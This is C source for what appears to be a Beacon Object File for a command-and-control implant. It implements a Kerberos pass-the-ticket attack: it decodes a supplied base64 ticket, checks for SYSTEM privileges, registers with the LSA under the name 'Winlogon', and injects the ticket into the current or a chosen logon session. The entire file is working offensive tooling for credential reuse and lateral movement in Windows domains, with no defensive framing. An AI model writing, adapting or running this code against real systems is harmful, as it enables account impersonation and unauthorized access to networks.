#include "_include/functions.c"

int base64_decode_char(char c) {
    if (c >= 'A' && c <= 'Z')
        return c - 'A';
    if (c >= 'a' && c <= 'z')
        return c - 'a' + 26;
    if (c >= '0' && c <= '9')
        return c - '0' + 52;
    if (c == '+')
        return 62;
    if (c == '/')
        return 63;
    return -1; // Invalid character
}

byte* base64_decode(byte* input, int* output_len) {
    int input_len = my_strlen(input);
    int padding = 0;
    if (input_len == 0) {
        *output_len = 0;
        return NULL;
    }

    if (input[input_len - 1] == '=') {
        padding++;
        if (input[input_len - 2] == '=') {
            padding++;
        }
    }

    *output_len = (input_len * 3) / 4 - padding;
    byte* output = MemAlloc(*output_len);
    if (output == NULL)
        return NULL;

    size_t i = 0, j = 0;
    while (i < input_len - padding) {
        UINT sextet_a = (input[i] == '=') ? 0 : (UINT)base64_decode_char(input[i]); i++;
        UINT sextet_b = (input[i] == '=') ? 0 : (UINT)base64_decode_char(input[i]); i++;
        UINT sextet_c = (input[i] == '=') ? 0 : (UINT)base64_decode_char(input[i]); i++;
        UINT sextet_d = (input[i] == '=') ? 0 : (UINT)base64_decode_char(input[i]); i++;

        UINT triple = (sextet_a << 18) + (sextet_b << 12) + (sextet_c << 6) + sextet_d;

        if (j < *output_len)
            output[j++] = (triple >> 16) & 0xFF;
        if (j < *output_len)
            output[j++] = (triple >> 8) & 0xFF;
        if (j < *output_len)
            output[j++] = triple & 0xFF;
    }
    return output;
}

HANDLE GetCurrentToken(DWORD DesiredAccess) {
    HANDLE hCurrentToken = NULL;
    if (!ADVAPI32$OpenThreadToken(KERNEL32$GetCurrentThread(), DesiredAccess, FALSE, &hCurrentToken))
        if (hCurrentToken == NULL && KERNEL32$GetLastError() == ERROR_NO_TOKEN)
            if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), DesiredAccess, &hCurrentToken))
                return NULL;
    return hCurrentToken;
}

LUID GetCurrentLUID(HANDLE TokenHandle) {
    TOKEN_STATISTICS tokenStats;
    DWORD tokenSize;
    if (!ADVAPI32$GetTokenInformation(TokenHandle, TokenStatistics, &tokenStats, sizeof(tokenStats), &tokenSize))
        return (LUID) { 0 };
    return tokenStats.AuthenticationId;
}

BOOL IsSystem(HANDLE TokenHandle) {
    UCHAR bTokenUser[sizeof(TOKEN_USER) + 8 + 4 * SID_MAX_SUB_AUTHORITIES];
    PTOKEN_USER pTokenUser = (PTOKEN_USER)bTokenUser;
    ULONG cbTokenUser;
    SID_IDENTIFIER_AUTHORITY siaNT = SECURITY_NT_AUTHORITY;
    PSID pSystemSid = NULL;
    BOOL bSystem = FALSE;

    // Try to open the token of the current thread first
    if (!ADVAPI32$OpenThreadToken(KERNEL32$GetCurrentThread(), TOKEN_QUERY, TRUE, &TokenHandle)) {
        // If there is no thread token, fall back to the process token
        if (KERNEL32$GetLastError() == ERROR_NO_TOKEN) {
            if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &TokenHandle)) {
                return FALSE;
            }
        } else {
            return FALSE;
        }
    }

    if (!ADVAPI32$GetTokenInformation(TokenHandle, TokenUser, pTokenUser, sizeof(bTokenUser), &cbTokenUser)) {
        return FALSE;
    }

    if (!ADVAPI32$AllocateAndInitializeSid(&siaNT, 1, SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &pSystemSid)) {
        return FALSE;
    }

    bSystem = ADVAPI32$EqualSid(pTokenUser->User.Sid, pSystemSid);

    ADVAPI32$FreeSid(pSystemSid);

    return bSystem;
}

BOOL GetLsaHandle(HANDLE hToken, BOOL highIntegrity, HANDLE* hLsa) {
    HANDLE hLsaLocal = NULL;
    ULONG  mode = 0;
    bool   status = true;
    if (highIntegrity) {
        STRING lsaString = (STRING){ .Length = 8, .MaximumLength = 9, .Buffer = "Winlogon" };
        status = SECUR32$LsaRegisterLogonProcess(&lsaString, &hLsaLocal, &mode);
    }
    else {
        status = SECUR32$LsaConnectUntrusted(&hLsaLocal);
    }
    *hLsa = hLsaLocal;
    return status;
}

int my_isdigit(int c) {
    return (c >= '0' && c <= '9');
}

int my_islower(int c) {
    return (c >= 'a' && c <= 'z');
}

unsigned long long my_strtoull(const char* str) {
    unsigned long long result = 0;
    if (!str) return 0;
    if (*str == '0' && (*(str + 1) == 'x' || *(str + 1) == 'X')) {
        str += 2;
    }
    while (*str) {
        char c = *str;
        int digit = 0;
        if (c >= '0' && c <= '9') digit = c - '0';
        else if (c >= 'a' && c <= 'f') digit = c - 'a' + 10;
        else if (c >= 'A' && c <= 'F') digit = c - 'A' + 10;
        else break;
        result = result * 16 + digit;
        str++;
    }
    return result;
}

void PTT(char* luid, byte* ticket) {
    HANDLE hToken = GetCurrentToken(TOKEN_QUERY);
    LUID   currentLuid = GetCurrentLUID(hToken);
    LUID   targetLuid = { 0 };
    bool   IsHighIntegrity = IsSystem(hToken);

    if (luid) {
        unsigned long long parsedLuid = my_strtoull(luid);
        if (parsedLuid == 0) {
            PRINT_OUT("[x] Invalid luid\n");
            return;
        }
        targetLuid.LowPart = (DWORD)(parsedLuid & 0xFFFFFFFF);
        targetLuid.HighPart = (LONG)(parsedLuid >> 32);
    }
    else {
        targetLuid = currentLuid;
    }

    if (!IsHighIntegrity && (currentLuid.LowPart != targetLuid.LowPart || currentLuid.HighPart != targetLuid.HighPart)) {
        PRINT_OUT("[X] You need to be in SYSTEM integrity.\n");
        return;
    }

    if (currentLuid.LowPart != targetLuid.LowPart || currentLuid.HighPart != targetLuid.HighPart)
        IsHighIntegrity = false;

    HANDLE hLsa;
    if (GetLsaHandle(hToken, IsHighIntegrity, &hLsa)) return;

    ULONG authPackage;
    LSA_STRING krbAuth = { .Buffer = "kerberos", .Length = 8, .MaximumLength = 9 };
    if (SECUR32$LsaLookupAuthenticationPackage(hLsa, &krbAuth, &authPackage) == 0) {

        int decode_ticket_size = 0;
        byte* decode_ticket = base64_decode(ticket, &decode_ticket_size);
        if (decode_ticket == NULL) {
            PRINT_OUT("[X] Failed to decode base64 ticket.\n");
            SECUR32$LsaDeregisterLogonProcess(hLsa);
            return;
        }

        int submitSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + decode_ticket_size;
        KERB_SUBMIT_TKT_REQUEST* submitRequest = MemAlloc(submitSize);
        if (submitRequest == NULL) {
            PRINT_OUT("[X] Memory allocation failed for submit request.\n");
            SECUR32$LsaDeregisterLogonProcess(hLsa);
            return;
        }

        submitRequest->MessageType = KerbSubmitTicketMessage;
        submitRequest->KerbCredSize = decode_ticket_size;
        submitRequest->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST);
        if (IsHighIntegrity)
            submitRequest->LogonId = targetLuid;
        else
            submitRequest->LogonId = (LUID){ 0 };

        MemCpy((PBYTE)submitRequest + submitRequest->KerbCredOffset, decode_ticket, decode_ticket_size);

        NTSTATUS protocolStatus = 0;
        ULONG    responseSize = 0;
        void*    response = NULL;

        NTSTATUS lsaStatus = SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage, submitRequest, submitSize, &response, &responseSize, &protocolStatus);

        if (lsaStatus != 0 || protocolStatus != 0) {
            PRINT_OUT("\n[X] Ticket not imported. LSA Status: 0x%08X, Protocol Status: 0x%08X\n", lsaStatus, protocolStatus);
        }
        else {
            PRINT_OUT("\n[+] Ticket successfully imported.\n");
        }

        if (response != NULL) {
            SECUR32$LsaFreeReturnBuffer(response);
        }
    }
    SECUR32$LsaDeregisterLogonProcess(hLsa);
}

void PTT_RUN( PCHAR Buffer, IN DWORD Length ) {
    PRINT_OUT("\n[*] Action: Import Ticket\n\n");

    char* ticket = NULL;
    char* luid = NULL;

    for (int i = 0; i < Length; i++) {
        i += GetStrParam(Buffer + i, Length - i, "/luid:", 6, &luid );
        i += GetStrParam(Buffer + i, Length - i, "/ticket:", 8, &ticket );
    }

    if (ticket)
        PTT(luid, ticket);
    else
        PRINT_OUT("[X] /ticket:BASE64 must be supplied!\n");
}

VOID go( IN PCHAR Buffer, IN ULONG Length ) {
    INIT_BOF();

    datap parser;
    BeaconDataParse(&parser, Buffer, Length);
    DWORD PARAM_SIZE = 0;
    PBYTE PARAM = BeaconDataExtract(&parser, &PARAM_SIZE);

    if( LoadFunc() )
        PRINT_OUT("%s\n", "Modules not loaded");
    else
        PTT_RUN( PARAM, PARAM_SIZE );

    FreeBank();

    END_BOF();
}
